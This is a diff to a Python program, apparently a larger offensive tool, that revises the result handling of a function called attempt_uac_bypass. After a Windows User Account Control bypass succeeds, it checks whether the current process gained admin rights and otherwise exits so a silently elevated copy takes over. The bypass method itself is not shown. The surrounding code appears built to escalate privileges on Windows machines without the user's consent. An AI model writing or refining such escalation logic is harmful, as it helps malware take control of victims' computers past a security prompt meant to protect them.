@@ -2050,9 +2050,30 @@ def attempt_uac_bypass():
     
     if result:
         debug_print("=" * 80)
-        debug_print("✅✅✅ [UAC BYPASS] SUCCESS! Admin privileges gained!")
+        debug_print("✅ [UAC BYPASS] Elevated instance launched successfully!")
+        debug_print("✅ [UAC BYPASS] Checking if THIS process gained admin...")
         debug_print("=" * 80)
-        log_message("✅ [UAC BYPASS] UAC bypass successful via UAC Manager!", "success")
+        
+        # Important: UAC bypass launches a NEW elevated instance
+        # We need to check if THIS current process is now admin
+        time.sleep(2)  # Give the elevated instance time to start
+        
+        if is_admin():
+            # Somehow THIS process became admin (unusual but possible)
+            debug_print("✅ [UAC BYPASS] THIS process is now admin!")
+            log_message("✅ [UAC BYPASS] UAC bypass successful - now running as admin!", "success")
+            return True
+        else:
+            # A separate elevated instance was launched
+            # This current process is still NOT admin
+            debug_print("⚠️ [UAC BYPASS] Elevated instance launched, but THIS process is still NOT admin")
+            debug_print("⚠️ [UAC BYPASS] THIS instance should EXIT to avoid duplicates")
+            debug_print("⚠️ [UAC BYPASS] The elevated instance will take over")
+            log_message("⚠️ [UAC BYPASS] Elevated instance launched - exiting current instance", "warning")
+            
+            # Exit this non-admin instance to prevent duplicates
+            time.sleep(2)  # Give elevated instance time to fully start
+            sys.exit(0)  # Exit old instance, let elevated instance take over
     else:
         debug_print("=" * 80)
         debug_print("❌❌❌ [UAC BYPASS] FAILED! All methods failed!")
